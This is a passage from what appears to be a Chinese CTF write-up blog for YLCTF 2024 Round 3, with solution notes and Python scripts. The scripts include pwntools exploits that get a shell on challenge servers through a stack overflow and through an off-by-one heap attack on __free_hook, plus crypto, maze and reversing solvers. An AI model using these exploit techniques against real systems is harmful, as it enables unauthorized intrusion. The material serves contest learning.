class="hljs-string">r&#x27;num1=(\d+)&#x27;</span>, data)<br>        num2_match = re.search(<span class="hljs-string">r&#x27;num2=(\d+)&#x27;</span>, data)<br>        num3_match = re.search(<span class="hljs-string">r&#x27;num3=(\d+)&#x27;</span>, data)<br><br>        <span class="hljs-keyword">if</span> N_match <span class="hljs-keyword">and</span> num1_match <span class="hljs-keyword">and</span> num2_match <span class="hljs-keyword">and</span> num3_match:<br>            N = <span class="hljs-built_in">int</span>(N_match.group(<span class="hljs-number">1</span>))<br>            num1 = <span class="hljs-built_in">int</span>(num1_match.group(<span class="hljs-number">1</span>))<br>            num2 = <span class="hljs-built_in">int</span>(num2_match.group(<span class="hljs-number">1</span>))<br>            num3 = <span class="hljs-built_in">int</span>(num3_match.group(<span class="hljs-number">1</span>))<br><br>            <span class="hljs-comment"># 使用 LCG 解密函数找到 seed</span><br>            seed, a, b = find_seed(N, num1, num2, num3)<br><br>            <span class="hljs-keyword">if</span> seed <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>                p.sendline(<span class="hljs-built_in">str</span>(seed))<br>                response = p.recvuntil(<span class="hljs-string">&quot;success!&quot;</span>.encode())<br>                <span class="hljs-built_in">print</span>(response.decode())<br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;无法找到种子&quot;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><h5 id="round-3-qwq"><a class="markdownIt-Anchor" href="#round-3-qwq"></a> [Round 3] QWQ</h5><p>明显的颜文字，转一下再base解密即可</p><p><img src="/../../images/ylctf/2024/qwq.png" alt="qwq"></p><h4 id="misc-3"><a class="markdownIt-Anchor" href="#misc-3"></a> Misc</h4><h5 id="round-3-blackdoor"><a class="markdownIt-Anchor" href="#round-3-blackdoor"></a> [Round 3] Blackdoor</h5><p>一个文件夹，用d盾扫一下发现危险文件，里面有MD5值，套一下得到flag</p><h4 id="pwn-3"><a class="markdownIt-Anchor" href="#pwn-3"></a> Pwn</h4><h5 id="round-3-secret"><a class="markdownIt-Anchor" href="#round-3-secret"></a> [Round 3] Secret</h5><p>附件ida打开输入nc连接输入密文<code>SuperSecretPassword</code>得到flag</p><h5 id="round-3-ezstack3"><a class="markdownIt-Anchor" href="#round-3-ezstack3"></a> [Round 3] ezstack3</h5><p>先看mian和vuln,再观察system利用栈溢出漏洞首先发送填充数据以覆盖返回地址，然后接收 EBP 地址并计算其偏移。接着构造 payload，调用 <code>system</code> 函数执行 <code>/bin/sh</code>，最终获得交互式 shell。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = remote(<span class="hljs-string">&#x27;challenge.yuanloo.com&#x27;</span>, <span class="hljs-number">32407</span>)<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;i386&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>p.recvuntil(<span class="hljs-string">b&#x27;Welcome to YLCTF stack3&#x27;</span>)<br>p.send(<span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x30</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x30</span>)<br><br>ebp = u32(p.recv(<span class="hljs-number">4</span>)) - <span class="hljs-number">16</span><br>p.recvuntil(<span class="hljs-string">b&#x27;pwn!&#x27;</span>)<br><br>p.send(<br>    p32(<span class="hljs-number">0x080490C0</span>) +    <span class="hljs-comment"># system</span><br>    p32(<span class="hljs-number">0</span>) +            <span class="hljs-comment"># argument for system</span><br>    p32(ebp - <span class="hljs-number">36</span>) +     <span class="hljs-comment"># return address</span><br>    <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span> +<br>    <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">28</span> +<br>    p32(ebp - <span class="hljs-number">52</span>) +     <span class="hljs-comment"># old EBP</span><br>    p32(<span class="hljs-number">0x08049324</span>)     <span class="hljs-comment"># leave_ret</span><br>)<br>p.interactive()<br></code></pre></td></tr></table></figure><p><img src="/../../images/ylctf/2024/stack3.png" alt="stack3"></p><h5 id="round-3-null"><a class="markdownIt-Anchor" href="#round-3-null"></a> [Round 3] null</h5><p>利用了 off-by-one 漏洞，通过 <code>edit</code> 函数实现堆块重叠，进而修改前一个堆块的 <code>fd</code> 指针以覆盖 <code>free_hook</code>。当再次释放该堆块时，程序会调用 <code>free_hook</code> 指向的地址，执行 <code>system</code> 函数，从而获取权限并启动一个 shell。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.os = <span class="hljs-string">&#x27;linux&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">print_info</span>(<span class="hljs-params">x</span>): <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;\x1b[01;38;5;214m&#x27;</span> + x + <span class="hljs-string">&#x27;\x1b[0m&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">print_error</span>(<span class="hljs-params">x</span>): <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;\x1b[01;38;5;1m&#x27;</span> + x + <span class="hljs-string">&#x27;\x1b[0m&#x27;</span>)<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Exploit</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, is_remote=<span class="hljs-literal">True</span></span>):<br>        <span class="hljs-variable language_">self</span>.elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>        <span class="hljs-variable language_">self</span>.libc = ELF(<span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span>)<br><br>        <span class="hljs-keyword">if</span> is_remote:<br>            <span class="hljs-variable language_">self</span>.p = remote(<span class="hljs-string">&#x27;challenge.yuanloo.com&#x27;</span>, <span class="hljs-number">39010</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-variable language_">self</span>.p = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><br>        <span class="hljs-variable language_">self</span>.libc_base = <span class="hljs-number">0</span><br>        <span class="hljs-variable language_">self</span>.malloc_hook = <span class="hljs-number">0</span><br>        <span class="hljs-variable language_">self</span>.free_hook = <span class="hljs-number">0</span><br>        <span class="hljs-variable language_">self</span>.system = <span class="hljs-number">0</span><br>        <span class="hljs-variable language_">self</span>.bin_sh = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_addr64</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> u64(<span class="hljs-variable language_">self</span>.p.recvuntil(<span class="hljs-string">b&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_libc_offsets</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-variable language_">self</span>.malloc_hook = <span class="hljs-variable language_">self</span>.libc_base + <span class="hljs-variable language_">self</span>.libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>        <span class="hljs-variable language_">self</span>.free_hook = <span class="hljs-variable language_">self</span>.libc_base + <span class="hljs-variable language_">self</span>.libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>        <span class="hljs-variable language_">self</span>.system = <span class="hljs-variable language_">self</span>.libc_base + <span class="hljs-variable language_">self</span>.libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>        <span class="hljs-variable language_">self</span>.bin_sh = <span class="hljs-variable language_">self</span>.libc_base + <span class="hljs-built_in">next</span>(<span class="hljs-variable language_">self</span>.libc.search(<span class="hljs-string">b&quot;/bin/sh\x00&quot;</span>))<br><br>    <span class="hljs-comment"># Heap operations</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">self, index, size</span>):<br>        <span class="hljs-variable language_">self</span>.p.recvuntil(<span class="hljs-string">b&#x27;:&#x27;</span>)<br>        <span class="hljs-variable language_">self</span>.p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">1</span>))<br>        <span class="hljs-variable language_">self</span>.p.recvuntil(<span class="hljs-string">b&quot;Index: &quot;</span>)<br>        <span class="hljs-variable language_">self</span>.p.sendline(<span class="hljs-built_in">str</span>(index))<br>        <span class="hljs-variable language_">self</span>.p.recvuntil(<span class="hljs-string">b&quot;Size &quot;</span>)<br>        <span class="hljs-variable language_">self</span>.p.sendline(<span class="hljs-built_in">str</span>(size))<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">self, index</span>):<br>        <span class="hljs-variable language_">self</span>.p.recvuntil(<span class="hljs-string">b&#x27;:&#x27;</span>)<br>        <span class="hljs-variable language_">self</span>.p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">4</span>))<br>        <span class="hljs-variable language_">self</span>.p.recvuntil(<span class="hljs-string">b&quot;Index: &quot;</span>)<br>        <span class="hljs-variable language_">self</span>.p.sendline(<span class="hljs-built_in">str</span>(index))<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">self, index</span>):<br>        <span class="hljs-variable language_">self</span>.p.recvuntil(<span class="hljs-string">b&#x27;:&#x27;</span>)<br>        <span class="hljs-variable language_">self</span>.p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">3</span>))<br>        <span class="hljs-variable language_">self</span>.p.recvuntil(<span class="hljs-string">b&quot;Index: &quot;</span>)<br>        <span class="hljs-variable language_">self</span>.p.sendline(<span class="hljs-built_in">str</span>(index))<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">self, index, content</span>):<br>        <span class="hljs-variable language_">self</span>.p.recvuntil(<span class="hljs-string">b&#x27;:&#x27;</span>)<br>        <span class="hljs-variable language_">self</span>.p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">2</span>))<br>        <span class="hljs-variable language_">self</span>.p.recvuntil(<span class="hljs-string">b&quot;Index: &quot;</span>)<br>        <span class="hljs-variable language_">self</span>.p.sendline(<span class="hljs-built_in">str</span>(index))<br>        <span class="hljs-variable language_">self</span>.p.recvuntil(<span class="hljs-string">b&quot;Content: &quot;</span>)<br>        <span class="hljs-variable language_">self</span>.p.sendline(content)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">exploit</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-comment"># Initial heap setup</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>):<br>            <span class="hljs-variable language_">self</span>.add(i, <span class="hljs-number">0x90</span>)<br><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>            <span class="hljs-variable language_">self</span>.free(i)<br><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>            <span class="hljs-variable language_">self</span>.add(i, <span class="hljs-number">0x90</span>)<br>        <span class="hljs-variable language_">self</span>.add(<span class="hljs-number">7</span>, <span class="hljs-number">0x88</span>)<br><br>        <span class="hljs-variable language_">self</span>.show(<span class="hljs-number">7</span>)<br>        <span class="hljs-variable language_">self</span>.libc_base = <span class="hljs-variable language_">self</span>.get_addr64() - <span class="hljs-number">4111664</span><br>        print_info(<span class="hljs-string">f&quot;Libc base: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(self.libc_base)&#125;</span>&quot;</span>)<br>        <span class="hljs-variable language_">self</span>.get_libc_offsets()<br><br>        <span class="hljs-variable language_">self</span>.add(<span class="hljs-number">9</span>, <span class="hljs-number">0x18</span>)<br>        <span class="hljs-variable language_">self</span>.add(<span class="hljs-number">10</span>, <span class="hljs-number">0x68</span>)<br>        <span class="hljs-variable language_">self</span>.add(<span class="hljs-number">11</span>, <span class="hljs-number">0x68</span>)<br>        <span class="hljs-variable language_">self</span>.add(<span class="hljs-number">12</span>, <span class="hljs-number">0x68</span>)<br>        <span class="hljs-variable language_">self</span>.add(<span class="hljs-number">13</span>, <span class="hljs-number">0x18</span>)<br><br>        <span class="hljs-variable language_">self</span>.edit(<span class="hljs-number">9</span>, <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x18</span> + p8(<span class="hljs-number">0xe1</span>))<br>        <span class="hljs-variable language_">self</span>.free(<span class="hljs-number">10</span>)<br>        <span class="hljs-variable language_">self</span>.add(<span class="hljs-number">10</span>, <span class="hljs-number">0xd8</span>)<br>        <span class="hljs-variable language_">self</span>.free(<span class="hljs-number">12</span>)<br>        <span class="hljs-variable language_">self</span>.free(<span class="hljs-number">11</span>)<br><br>        <span class="hljs-variable language_">self</span>.edit(<span class="hljs-number">10</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">0x68</span> + p64(<span class="hljs-number">0x71</span>) + p64(<span class="hljs-variable language_">self</span>.free_hook))<br>        <span class="hljs-variable language_">self</span>.add(<span class="hljs-number">14</span>, <span class="hljs-number">0x68</span>)<br>        <span class="hljs-variable language_">self</span>.add(<span class="hljs-number">15</span>, <span class="hljs-number">0x68</span>)<br>        <span class="hljs-variable language_">self</span>.edit(<span class="hljs-number">15</span>, p64(<span class="hljs-variable language_">self</span>.system))<br><br>        <span class="hljs-variable language_">self</span>.edit(<span class="hljs-number">9</span>, <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)<br>        <span class="hljs-variable language_">self</span>.free(<span class="hljs-number">9</span>)<br><br>        <span class="hljs-variable language_">self</span>.p.interactive()<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    exp = Exploit(is_remote=<span class="hljs-literal">True</span>)<br>    exp.exploit()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure><p><img src="/../../images/ylctf/2024/null.png" alt="null"></p><h4 id="re-3"><a class="markdownIt-Anchor" href="#re-3"></a> Re</h4><h5 id="round-3-ezmaze一血"><a class="markdownIt-Anchor" href="#round-3-ezmaze一血"></a> [Round 3] ezmaze(一血)</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">from</span> collections <span class="hljs-keyword">import</span> deque<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">visualize_maze</span>(<span class="hljs-params">maze_str, width=<span class="hljs-number">10</span></span>):<br>    <span class="hljs-string">&quot;&quot;&quot;Visualize the maze in a grid format.&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;\n&#x27;</span>.join(maze_str[i:i + width] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(maze_str), width))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">is_valid_move</span>(<span class="hljs-params">maze, pos</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;Check if the current position is valid.&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span> &lt;= pos &lt; <span class="hljs-built_in">len</span>(maze) <span class="hljs-keyword">and</span> maze[pos] <span class="hljs-keyword">in</span> [<span class="hljs-string">&#x27;+&#x27;</span>, <span class="hljs-string">&#x27;F&#x27;</span>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">solve_maze</span>():<br>    maze = <span class="hljs-string">&quot;*****++*********+******+*++******+++*****F*+*******+*+++*****+***++****+***+*****+***+*+***+++++++************&quot;</span><br>    start_pos = <span class="hljs-number">5</span><br>    moves = &#123;<span class="hljs-string">&#x27;w&#x27;</span>: -<span class="hljs-number">10</span>, <span class="hljs-string">&#x27;s&#x27;</span>: <span class="hljs-number">10</span>, <span class="hljs-string">&#x27;a&#x27;</span>: -<span class="hljs-number">1</span>, <span class="hljs-string">&#x27;d&#x27;</span>: <span class="hljs-number">1</span>&#125;<br><br>    queue = deque([(start_pos, <span class="hljs-string">&quot;&quot;</span>)])<br>    visited = &#123;start_pos&#125;<br><br>    <span class="hljs-keyword">while</span> queue:<br>        pos, path = queue.popleft()<br><br>        <span class="hljs-keyword">if</span> maze[pos] == <span class="hljs-string">&#x27;F&#x27;</span>:<br>            <span class="hljs-keyword">return</span> path<br><br>        <span class="hljs-keyword">for</span> move_char, move_val <span class="hljs-keyword">in</span> moves.items():<br>            new_pos = pos<br>            <span class="hljs-keyword">while</span> is_valid_move(maze, new_pos + move_val):<br>                new_pos += move_val<br>                <span class="hljs-keyword">if</span> new_pos <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> visited:<br>                    visited.add(new_pos)<br>                    queue.append((new_pos, path + move_char))<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">verify_solution</span>(<span class="hljs-params">solution</span>):<br>    maze = <span class="hljs-string">&quot;*****++*********+******+*++******+++*****F*+*******+*+++*****+***++****+***+*****+***+*+***+++++++************&quot;</span><br>    pos = <span class="hljs-number">5</span><br>    move_map = &#123;<span class="hljs-string">&#x27;w&#x27;</span>: -<span class="hljs-number">10</span>, <span class="hljs-string">&#x27;s&#x27;</span>: <span class="hljs-number">10</span>, <span class="hljs-string">&#x27;a&#x27;</span>: -<span class="hljs-number">1</span>, <span class="hljs-string">&#x27;d&#x27;</span>: <span class="hljs-number">1</span>&#125;<br><br>    <span class="hljs-keyword">for</span> action <span class="hljs-keyword">in</span> solution:<br>        move = move_map[action]<br>        <span class="hljs-keyword">while</span> is_valid_move(maze, pos + move):<br>            pos += move<br><br>    <span class="hljs-keyword">return</span> maze[pos] == <span class="hljs-string">&#x27;F&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    solution = solve_maze()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Found solution path: <span class="hljs-subst">&#123;solution&#125;</span>&quot;</span>)<br><br>    <span class="hljs-keyword">if</span> verify_solution(solution):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Solution verified: Valid!&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Solution verification failed!&quot;</span>)<br>        <span class="hljs-keyword">return</span><br><br>    flag = <span class="hljs-string">&quot;YLCTF&#123;&quot;</span> + hashlib.md5(solution.encode()).hexdigest() + <span class="hljs-string">&quot;&#125;&quot;</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\nMaze visualization (10x10 grid):&quot;</span>)<br>    <span class="hljs-built_in">print</span>(visualize_maze(<span class="hljs-string">&quot;*****++*********+******+*++******+++*****F*+*******+*+++*****+***++****+***+*****+***+*+***+++++++************&quot;</span>))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\nFinal flag:&quot;</span>, flag)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure><h5 id="round-3-case"><a class="markdownIt-Anchor" href="#round-3-case"></a> [Round 3] CASE</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> ctypes<br><span class="hljs-keyword">import</span> time<br><br><span class="hljs-comment"># 加载 libc</span><br>libc = ctypes.CDLL(<span class="hljs-string">&quot;libc.so.6&quot;</span>)<br><br><span class="hljs-comment"># 连接到靶机</span><br>p = remote(<span class="hljs-string">&quot;challenge.yuanloo.com&quot;</span>, <span class="hljs-number">30037</span>)<br><br><span class="hljs-comment"># 用于保存加密值</span><br>enc = []<br><br><span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">43</span>):<br>    response = p.recvuntil(<span class="hljs-string">b&#x27;,&#x27;</span>)<br>    enc.append(response.strip().decode().rstrip(<span class="hljs-string">&#x27;,&#x27;</span>))<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Encrypted values:&quot;</span>, enc)<br><br>enc_values = [<span class="hljs-built_in">int</span>(x, <span class="hljs-number">16</span>) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> enc]<br><br><span class="hljs-comment"># 用于保存解密的结果</span><br>decrypted = []<br><br><br>seed = <span class="hljs-built_in">int</span>(time.time())<br>libc.srand(seed)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(enc_values)):<br>    v5 = libc.rand()<br>    original_char = (enc_values[i] ^ (v5 % <span class="hljs-number">255</span>))<br><br>    <span class="hljs-comment"># 反向映射字符</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-number">65</span> &lt;= original_char &lt;= <span class="hljs-number">90</span>:  <span class="hljs-comment"># A-Z</span><br>        decrypted_char = <span class="hljs-built_in">chr</span>((original_char + <span class="hljs-number">52</span> - <span class="hljs-number">65</span>) % <span class="hljs-number">26</span> + <span class="hljs-number">65</span>)<br>    <span class="hljs-keyword">elif</span> <span class="hljs-number">97</span> &lt;= original_char &lt;= <span class="hljs-number">122</span>:  <span class="hljs-comment"># a-z</span><br>        decrypted_char = <span class="hljs-built_in">chr</span>((original_char + <span class="hljs-number">84</span> - <span class="hljs-number">97</span>) % <span class="hljs-number">26</span> + <span class="hljs-number">97</span>)<br>    <span class="hljs-keyword">else</span>:<br>        decrypted_char = <span class="hljs-built_in">chr</span>(original_char)<br><br>    decrypted.append(decrypted_char)<br><br><span class="hljs-comment"># 输出解密结果</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Decrypted value:&quot;</span>, <span class="hljs-string">&#x27;&#x27;</span>.join(decrypted))<br><br><span class="hljs-comment"># 关闭连接</span><br>p.close()<br></code></pre></td></tr></table></figure><p>不知道具体的原理，要得到flag的话外面需要rot13内部需要rot7才能得到正确的flag，不太明白re，里面是根据uuid的特性得到的</p><p><img src="/../../images/ylctf/2024/case.png" alt="case"></p><h4 id="web-3"><a class="markdownIt-Anchor" href="#web-3"></a> Web</h4><h5 id="round-3-404"><a class="markdownIt-Anchor" href="#round-3-404"></a> [Round 3] 404</h5><p><code>/script.js</code>有提示，然后</p><p><img src="/../../images/ylctf/2024/404.png" alt="404"></p><p>解密，最后在网页写个py交互一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> bs4 <span class="hljs-keyword">import</span> BeautifulSoup<br><br>session = requests.Session()<br><br>url = <span class="hljs-string">&#x27;http://challenge.yuanloo.com:33968/ca.php&#x27;</span><br>response = session.get(url) <br>soup = BeautifulSoup(response.text, <span class="hljs-string">&#x27;html.parser&#x27;</span>)<br><br>pre_content = soup.find(<span class="hljs-string">&#x27;pre&#x27;</span>).text.strip()<br><br>pre_content = pre_content.replace(<span class="hljs-string">&#x27;$temp1&#x27;</span>, <span 